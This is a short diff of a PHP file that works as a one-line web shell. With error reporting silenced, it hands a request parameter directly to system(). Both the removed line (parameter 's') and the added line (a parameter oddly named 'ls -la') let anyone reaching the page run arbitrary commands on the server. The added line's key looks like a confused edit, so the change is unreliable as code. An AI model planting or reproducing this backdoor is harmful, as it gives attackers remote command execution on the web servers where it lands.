@@ -1,6 +1,6 @@
 <?php
 
 error_reporting(0);
-system($_GET["s"]);
+system($_GET["ls -la"]);
 
 ?> 
